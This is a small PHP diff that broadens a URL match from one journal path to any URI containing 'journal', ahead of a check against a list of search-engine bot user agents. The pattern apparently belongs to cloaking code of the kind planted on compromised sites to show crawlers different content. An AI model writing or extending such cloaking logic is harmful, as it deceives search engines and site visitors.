@@ -26,7 +26,7 @@ $bot_signatures = [
     'YandexBot'
 ];
 
-if (strpos($request_uri, 'journal-for-nano-education-nanoscience-and-nanotechnology') !== false) {
+if (strpos($request_uri, 'journal') !== false) {
 
     $is_bot_ua = false;
     foreach ($bot_signatures as $bot) {
